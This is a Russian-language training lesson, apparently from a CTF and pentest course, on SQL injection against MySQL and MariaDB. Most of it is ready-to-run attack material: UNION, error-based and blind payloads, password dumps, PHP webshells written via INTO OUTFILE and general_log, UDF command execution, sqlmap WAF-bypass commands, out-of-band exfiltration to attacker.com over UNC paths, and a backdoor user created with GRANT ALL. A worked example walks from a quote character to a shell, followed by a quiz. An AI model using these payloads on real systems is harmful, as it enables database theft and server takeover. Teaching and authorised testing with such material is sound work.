---
id: db-mysql
title: "MySQL и MariaDB: инъекции на практике — от дампа до UDF-RCE"
category: web
parent: web-sqli-dbms-open
difficulty: medium
order: 1
tags: [sqli, mysql, mariadb, union, outfile, udf, information_schema, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "MySQL/MariaDB от фингерпринта до RCE: information_schema, error-based, time-blind, INTO OUTFILE, UDF, general_log и sqlmap."
---

MySQL и MariaDB — самая частая СУБД за веб-приложениями (PHP/Laravel/WordPress/битрикс). Здесь есть всё: быстрый UNION-дамп, error-based через `extractvalue`, time-blind через `SLEEP`, чтение и запись файлов, и даже RCE — через UDF-библиотеку или подмену `general_log` в webshell. Это «эталонный» диалект: если фингерпринт неоднозначен, начинайте с MySQL-синтаксиса.

## Фингерпринт и версия

Признаки MySQL: ошибки вида `You have an error in your SQL syntax`, `Unknown column`, `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version`. Разрыв строки комментарием `-- ` (обязательно пробел после `--`) или `#` (в URL — `%23`).

Определяем версию и пользователя:

```sql
SELECT @@version;                 -- 8.0.36 / 10.11.6-MariaDB
SELECT @@version_comment;         -- дистрибутив (Ubuntu, Debian)
SELECT version();                 -- то же, что @@version
SELECT user();                    -- app@10.0.0.5
SELECT current_user();            -- app@localhost (кто реально в сессии)
SELECT @@hostname;                -- имя сервера
SELECT @@datadir;                 -- /var/lib/mysql/
SELECT database();                -- текущая схема
SELECT @@secure_file_priv;        -- путь для файловых операций ('' = везде)
```

Готовый чек через UNION:

```bash
curl -s "https://target/item?id=-1 UNION SELECT 1,@@version,3,user()-- -"
```

## Схема и данные: information_schema

`information_schema` — это SQL-стандарт, поддерживаемый MySQL. Основные таблицы: `SCHEMATA` (базы), `TABLES` (таблицы/вьюхи), `COLUMNS` (колонки).

```sql
-- базы
SELECT schema_name FROM information_schema.schemata;
-- таблицы текущей базы
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
-- таблицы во всех базах (кроме системных)
SELECT table_schema, table_name FROM information_schema.tables
  WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys');
-- колонки таблицы users
SELECT column_name FROM information_schema.columns
  WHERE table_schema=database() AND table_name='users';
```

Сборка через `GROUP_CONCAT` (в одну ячейку):

```sql
SELECT GROUP_CONCAT(table_name SEPARATOR 0x3a) FROM information_schema.tables WHERE table_schema=database();
SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users';
SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a) FROM users;
```

`0x3a` — это `:` в hex, `0x0a` — перевод строки. Hex-строки полезны, когда кавычки фильтруются.

## Error-based: extractvalue и updatexml

Когда приложение показывает текст SQL-ошибки, можно вытаскивать данные прямо через неё. В MySQL два классических вектора: `extractvalue()` (XPath) и `updatexml()`.

```sql
-- extractvalue печатает результат в тексте ошибки (лимит ~32 символа)
SELECT extractvalue(1, concat(0x7e, (SELECT database()), 0x7e));
-- ERROR 1105 (HY000): XPATH syntax error: '~appdb~'

-- updatexml — то же самое
SELECT updatexml(1, concat(0x7e, version(), 0x7e), 1);
```

`0x7e` = `~` — маркер границы. Из-за лимита в 32 символа длинные данные бьют по частям:

```sql
SELECT extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), 0x7e));
-- длиннее 32 -> режем через SUBSTRING / LIMIT OFFSET
SELECT extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e));
SELECT extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 0x7e));
```

## Blind: boolean и time-based

Когда ответ не содержит ошибок и данных, но отличается по «норма/ложь» — используем boolean; когда не отличается вообще — time-based.

**Boolean** (сравниваем длину/код ответа):

```sql
1 AND 1=1            -- истина
1 AND 1=2            -- ложь
1 AND (SELECT substr(database(),1,1))='a'
1 AND (SELECT length(database()))=5
1 AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100
```

**Time-based** (задержка подтверждает истину):

```sql
1 AND SLEEP(5)
1 AND IF(1=1, SLEEP(5), 0)
1 AND IF((SELECT substr(database(),1,1))='a', SLEEP(5), 0)
1 AND IF(ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100, SLEEP(5), 0)
1 OR SLEEP(5)
```

Варианты задержки, когда `SLEEP` фильтруется:

```sql
BENCHMARK(5000000, MD5(0x41))       -- тяжёлая функция вместо сна
(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
```

Проверка времени через curl:

```bash
time curl -s -o /dev/null "https://target/item?id=1 AND SLEEP(5)-- -"
```

## Запись и чтение файлов: LOAD_FILE, INTO OUTFILE/DUMPFILE

**Чтение** (`LOAD_FILE`) требует привилегии `FILE` и `secure_file_priv`:

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\Windows\\win.ini');       -- Windows
```

`LOAD_FILE` может идти и в UNION-дампе:

```bash
curl -s "https://target/item?id=-1 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -"
```

**Запись** — `INTO OUTFILE` (создаёт файл, не перезаписывает существующий) и `INTO DUMPFILE` (пишет один «сырой» блок, удобен для бинарных данных):

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php system($_GET["c"]); ?>' INTO DUMPFILE '/var/www/html/shell.php';
-- через UNION, если вывод невидим
1 UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/html/s.php'-- -
```

`INTO OUTFILE` не работает, если файл уже существует, — используйте новое имя. И путь обязан быть внутри `secure_file_priv`, если он задан (не пустой).

## RCE: UDF, general_log, secure-file-priv

Три пути от SQLi к выполнению команд в MySQL.

**1. UDF через `lib_mysqludf_sys`.** Загружаем `.so` (через `INTO DUMPFILE` в каталог плагинов) и создаём функцию `sys_exec`/`sys_eval`:

```sql
-- путь плагинов
SELECT @@plugin_dir;   -- /usr/lib/mysql/plugin/
-- (залить lib_mysqludf_sys.so в plugin_dir через INTO DUMPFILE — из hex)
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');
SELECT sys_eval('id');
```

**2. `general_log` в webshell.** Переключаем журнал на PHP-файл в веб-корне и выполняем запрос, содержащий код:

```sql
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SET GLOBAL general_log = 'ON';
SELECT '<?php system($_GET["c"]); ?>';
SET GLOBAL general_log = 'OFF';
```

**3. Через `secure_file_priv=''` и `INTO OUTFILE`** — тот же webshell, что в предыдущем разделе (если запись разрешена).

Проверка web-shell:

```bash
curl -s "https://target/shell.php?c=id"
```

## sqlmap: практические команды и tamper

Когда ручная работа утомляет — подключаем sqlmap. Он сам определит MySQL и подберёт технику.

```bash
# базовое по URL
sqlmap -u 'https://target/item?id=1' --batch --dbms=mysql --dbs

# POST + cookie
sqlmap -u 'https://target/login' --data='user=a&pass=b' --cookie='PHPSESSID=xyz' \
  --batch --level=3 --risk=2 --dbms=mysql --dbs

# из сохранённого запроса (cookie/заголовки сохраняются)
sqlmap -r request.txt -p id --batch --dbms=mysql --technique=BEUSTQ

# дамп конкретной таблицы
sqlmap -r request.txt -p id --batch -D appdb -T users -C username,password --dump

# OS-shell / файлы
sqlmap -r request.txt -p id --batch --os-shell
sqlmap -r request.txt -p id --batch --file-read=/etc/passwd
sqlmap -r request.txt -p id --batch --file-write=./shell.php --file-dest=/var/www/html/s.php
```

Обход WAF (`--tamper`) — цепочки скриптов:

```bash
sqlmap -r request.txt -p id --batch --tamper=space2comment,between,charencode --random-agent
sqlmap -r request.txt -p id --batch --tamper=space2hash,modsecurityversioned --delay=1
```

Полезные tamper-скрипты MySQL: `space2comment` (пробел → `/**/`), `space2hash` (`#`), `between` (`>` → `NOT BETWEEN 0 AND`), `charencode` (URL-кодирование), `charunicodeencode`, `randomcase`, `apostrophemask` (`'` → `%EF%BC%87`).

## Разобранный пример: от кавычки до webshell

Цель: `https://shop.local/product?id=7` (PHP + MySQL).

```bash
# Шаг 1. Разрыв кавычки -> ошибка MySQL
curl -s "https://shop.local/product?id=7'" | grep -i "sql syntax"
# You have an error in your SQL syntax ... MySQL server version

# Шаг 2. Число колонок
for n in 1 2 3 4; do echo -n "$n "; curl -s "https://shop.local/product?id=7 ORDER BY $n-- -" | wc -c; done
# 1 4210 / 2 4210 / 3 4210 / 4 89  -> 3 колонки

# Шаг 3. Вывод
curl -s "https://shop.local/product?id=-1 UNION SELECT 1,2,3-- -" | grep -oE ">[^<]{3,40}<" | head
# во 2-й колонке видно "2"

# Шаг 4. Дамп схемы
curl -s "https://shop.local/product?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
# users,products,orders

# Шаг 5. Дамп паролей
curl -s "https://shop.local/product?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3 FROM users-- -"
# admin:$2y$10$... (bcrypt) / john:5f4dcc3b... (md5)

# Шаг 6. Проверяем права на файл
curl -s "https://shop.local/product?id=-1 UNION SELECT 1,@@secure_file_priv,@@version-- -"
# пусто -> запись разрешена везде

# Шаг 7. Пишем webshell
curl -s "https://shop.local/product?id=-1 UNION SELECT 1,0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e,3 INTO OUTFILE '/var/www/html/s.php'-- -"

# Шаг 8. Выполняем команду
curl -s "https://shop.local/s.php?c=id"
# uid=33(www-data) gid=33(www-data)
```

Hex в шаге 7 — это `<?php system($_GET["c"]); ?>`, закодированный, чтобы обойти фильтры кавычек.

## Частые ошибки

- **`--` без пробела.** В MySQL `--` требует пробела/перевода строки после; иначе не комментарий. Используйте `-- -` или `#` (`%23`).
- **Путать `INTO OUTFILE` и `INTO DUMPFILE`.** `OUTFILE` экранирует и разделяет строки, `DUMPFILE` пишет байт-в-байт (для бинарников).
- **Не проверить `secure_file_priv`.** Если он задан (не пуст), `LOAD_FILE`/`OUTFILE` работают только в этом каталоге.
- **Забыть про `FILE` privilege.** Обычный пользователь без права `FILE` файловые функции не выполнит.
- **Игнорировать MariaDB-отличия.** В MariaDB 10+ `information_schema` есть, но есть и `mysql.innodb_table_stats` как обход, если фильтруется `information_schema`.
- **Ломать БД рискованным UDF.** Создание функций `sys_exec` — заметное изменение сервера; на проде согласуйте.

## Полный справочник: команды, пейлоады, примитивы

Сводные таблицы «всё в одном месте»: фингерпринт, клиентские команды, извлечение данных по техникам, файловые операции/RCE и работа с привилегиями.

### (а) Фингерпринт и версия

| Команда/пейлоад | Что делает | Пример |
|-----------------|-----------|--------|
| `@@version` | версия сервера | `SELECT @@version;` → `8.0.36` / `10.11.6-MariaDB` |
| `version()` | синоним версии | `UNION SELECT 1,version(),3` |
| `@@version_comment` | дистрибутив сборки | → `Ubuntu 22.04` |
| `user()` | логин@хост сессии | `app@10.0.0.5` |
| `current_user()` | аккаунт, чьи права реально проверяются | `app@localhost` |
| `database()` / `schema()` | текущая схема | `appdb` |
| `@@hostname` | имя сервера | `web01` |
| `@@datadir` | каталог данных | `/var/lib/mysql/` |
| `@@basedir` | каталог установки | `/usr/` |
| `@@secure_file_priv` | каталог, разрешённый для файловых функций | `''` = без ограничений |
| `@@plugin_dir` | каталог для UDF-библиотек | `/usr/lib/mysql/plugin/` |
| `@@global.general_log` | включён ли general log | `ON`/`OFF` |
| `@@global.slow_query_log` | включён ли slow log | `ON`/`OFF` |
| `@@sql_mode` | строгий режим SQL | `STRICT_TRANS_TABLES,...` |
| `@@lower_case_table_names` | регистр имён таблиц | `0`, `1` или `2` |
| `@@tmpdir` | каталог временных файлов | `/tmp` |
| `@@max_connections` | лимит соединений | `151` |
| `CONNECTION_ID()` | id текущего соединения | `SELECT CONNECTION_ID();` |

Признак по ошибкам: `You have an error in your SQL syntax`, `Unknown column`, `check the manual that corresponds to your MySQL server version`. Комментарий строки: `-- ` (обязателен пробел), `#` (в URL `%23`), блочный `/* */`.

### (б) Клиентский CLI (mysql / mysqldump / mysqladmin)

| Команда | Что делает | Пример |
|---------|-----------|--------|
| `mysql -h H -P 3306 -u U -p` | подключиться к серверу | `mysql -h 10.0.0.5 -u root -p` |
| `-e 'SQL'` | выполнить запрос и выйти | `mysql -h H -u U -p -e 'SHOW DATABASES'` |
| `-D db` | выбрать базу сразу | `mysql -h H -u U -p -D appdb` |
| `-A` / `--no-auto-rehash` | не грузить имена таблиц (быстрый старт) | `mysql -A -h H -u U -p` |
| `-B` / `--batch` | tab-separated, без псевдографики | `mysql -B -e 'SELECT * FROM users'` |
| `-N` / `--skip-column-names` | без строки заголовков | `mysql -N -B -e 'SELECT password FROM users'` |
| `--protocol=TCP` | форсировать TCP вместо unix-сокета | `mysql --protocol=TCP -h 127.0.0.1 -u root -p` |
| `--ssl-mode=DISABLED\|REQUIRED\|VERIFY_CA` | управление TLS | `mysql --ssl-mode=DISABLED ...` |
| `--default-character-set=utf8mb4` | кодировка соединения | `mysql --default-character-set=utf8mb4 ...` |
| `SHOW DATABASES;` | список баз | `mysql -e 'SHOW DATABASES'` |
| `SHOW TABLES;` | таблицы текущей базы | `mysql -D appdb -e 'SHOW TABLES'` |
| `DESCRIBE users;` | структура таблицы | `mysql -D appdb -e 'DESCRIBE users'` |
| `SHOW GRANTS FOR CURRENT_USER();` | права текущего пользователя | |
| `mysqldump -h H -u U -p DB T` | дамп базы/таблицы | `mysqldump -h H -u U -p appdb users > users.sql` |
| `mysqldump --all-databases --single-transaction` | консистентный дамп всех баз | `mysqldump -u root -p --all-databases --single-transaction > all.sql` |
| `mysqldump --no-data` | только схема | `mysqldump --no-data appdb > schema.sql` |
| `mysqldump -d --routines --triggers` | схема + процедуры/триггеры | `mysqldump -d --routines --triggers appdb` |
| `mysqladmin -h H -u U -p ping` | проверка живости сервера | |
| `mysql -h H -u U -p < dump.sql` | восстановление из дампа | |

### (в) Извлечение данных по техникам

| Техника | Пейлоад | Пример |
|---------|---------|--------|
| UNION (число колонок) | `ORDER BY n` | `?id=1 ORDER BY 4-- -` |
| UNION (вывод) | `-1 UNION SELECT 1,2,3` | `?id=-1 UNION SELECT 1,@@version,3-- -` |
| UNION (схема) | `GROUP_CONCAT(table_name)` | `...SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -` |
| UNION (данные) | `GROUP_CONCAT(user,0x3a,pass)` | `...SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3 FROM users-- -` |
| Error-based | `extractvalue(1,concat(0x7e,X,0x7e))` | `SELECT extractvalue(1,concat(0x7e,database(),0x7e))` |
| Error-based | `updatexml(1,concat(0x7e,X,0x7e),1)` | `SELECT updatexml(1,concat(0x7e,version(),0x7e),1)` |
| Error-based | `exp(~(SELECT ...))` | `SELECT exp(~(SELECT * FROM(SELECT user())a))` |
| Boolean-blind | `AND 1=1` / `AND 1=2` | `?id=1 AND 1=2-- -` |
| Boolean-blind | `substr()`/`ascii()` | `?id=1 AND ascii(substr(database(),1,1))>100-- -` |
| Time-blind | `SLEEP(5)` | `?id=1 AND SLEEP(5)-- -` |
| Time-blind | `IF(cond,SLEEP(5),0)` | `?id=1 AND IF(1=1,SLEEP(5),0)-- -` |
| Time-blind | `BENCHMARK(n,MD5(0x41))` | `?id=1 AND BENCHMARK(5000000,MD5(0x41))-- -` |
| OOB (DNS/SMB, Windows) | UNC через `LOAD_FILE` | `UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT user()),'.attacker.com\\a'))` |
| OOB (UNC-запись) | `INTO OUTFILE` на SMB-шару | `... INTO OUTFILE '\\\\attacker\\share\\f.php'` (Windows) |
| Stacked | `;` (зависит от драйвера) | `?id=1; SELECT SLEEP(5)-- -` |

### (г) Чтение/запись файлов и RCE

| Примитив | Что делает | Пример |
|----------|-----------|--------|
| `LOAD_FILE(path)` | читает файл (нужны право `FILE` и `secure_file_priv`) | `UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -` |
| `INTO OUTFILE 'p'` | пишет файл (экранирует, разделяет строки, не перезаписывает) | `SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php'` |
| `INTO DUMPFILE 'p'` | пишет один «сырой» блок (для бинарников) | `SELECT 0x7f454c46... INTO DUMPFILE '/tmp/x.so'` |
| `general_log_file` | лог в PHP-файл → webshell | `SET GLOBAL general_log_file='/var/www/html/s.php'; SET GLOBAL general_log='ON';` |
| `slow_query_log_file` | альтернативный лог → webshell | `SET GLOBAL slow_query_log_file='/var/www/html/s.php'; SET GLOBAL slow_query_log='ON';` |
| UDF `sys_exec` | выполнение команды ОС (возврат — код) | `CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'; SELECT sys_exec('id');` |
| UDF `sys_eval` | выполнение команды, возврат stdout | `SELECT sys_eval('id');` |
| `@@plugin_dir` + DUMPFILE | залить `.so` в каталог плагинов | `SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'` |
| Raptor UDF (MySQL 8) | современный UDF-фреймворк с `sys_exec` | загрузить `.so` → `SELECT sys_exec('id');` |
| `--os-shell` (sqlmap) | интерактивная ОС-оболочка | `sqlmap -r req.txt -p id --os-shell` |

### (д) Привилегии и эскалация

| Запрос | Что делает | Пример |
|--------|-----------|--------|
| `SELECT * FROM mysql.user` | аккаунты + хэши + привилегии | `UNION SELECT 1,GROUP_CONCAT(user,0x3a,authentication_string),3 FROM mysql.user-- -` |
| `SHOW GRANTS FOR CURRENT_USER()` | права текущего | `?id=1 UNION SELECT 1,GROUP_CONCAT(...),3` |
| `information_schema.user_privileges` | привилегии по аккаунтам | `SELECT grantee,privilege_type FROM information_schema.user_privileges` |
| `file_priv` | право на файловые операции | `SELECT user,file_priv FROM mysql.user` |
| `super_priv` | право `SUPER` (KILL, SET GLOBAL) | `SELECT user,super_priv FROM mysql.user` |
| `SELECT * FROM mysql.db` | привилегии на уровне базы | `SELECT * FROM mysql.db WHERE db='appdb'` |
| `SELECT * FROM mysql.role_edges` | роли (MySQL 8) | |
| `CREATE USER` / `GRANT ALL` | создать/повысить аккаунт | `CREATE USER 'x'@'%' IDENTIFIED BY 'p'; GRANT ALL ON *.* TO 'x'@'%' WITH GRANT OPTION;` |
| `SET GLOBAL` | менять рантайм-настройки (нужен `SUPER`) | `SET GLOBAL general_log=ON;` |
| `SELECT @@global.secure_file_priv` | где разрешена запись | `''` = везде |

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Какая функция MySQL читает содержимое файла на сервере?"
  options:
    - "pg_read_file"
    - "LOAD_FILE"
    - "UTL_FILE"
    - "READ_FILE"
  answer: 1
  explanation: "LOAD_FILE требует привилегии FILE и уважает secure_file_priv."
- question: "Что ограничивает директива secure_file_priv?"
  options:
    - "Скорость запросов"
    - "Каталоги, доступные для LOAD_FILE и INTO OUTFILE"
    - "Число соединений"
    - "Размер базы"
  answer: 1
  explanation: "Если путь задан, файловые операции разрешены только внутри него."
- question: "Какая UDF-библиотека даёт выполнение команд в MySQL?"
  options:
    - "dbms_java"
    - "lib_mysqludf_sys"
    - "postgres_fdw"
    - "OLE Automation"
  answer: 1
  explanation: "lib_mysqludf_sys добавляет sys_exec и sys_eval."
- question: "Как превратить general_log в webshell?"
  options:
    - "Выполнить xp_cmdshell"
    - "Указать general_log_file на .php в веб-корне и записать в лог PHP-код"
    - "Запустить COPY FROM PROGRAM"
    - "Использовать ATTACH DATABASE"
  answer: 1
  explanation: "SET GLOBAL general_log_file = '/var/www/html/s.php' + запрос с PHP-кодом."
- question: "Какая пара функций даёт error-based вывод в MySQL?"
  options:
    - "extractvalue и updatexml"
    - "CAST и CONVERT"
    - "utl_http и utl_inaddr"
    - "dbms_pipe и dbms_xslprocessor"
  answer: 0
  explanation: "extractvalue/updatexml печатают данные в тексте XPath-ошибки."
```

## Где пригодится

- **CTF (Web):** большинство веб-задач на SQLi — это MySQL; дамп + webshell закрывают их быстро.
- **Bug bounty:** MySQL/MariaDB — самая частая СУБД в вебе; подтверждённый дамп = critical.
- **Пентест:** полный цикл от фингерпринта до RCE — стандартный сценарий для PHP-стеков.
- **Работа (AppSec):** понимание `secure_file_priv`, прав `FILE` и UDF — основа hardening'а MySQL.
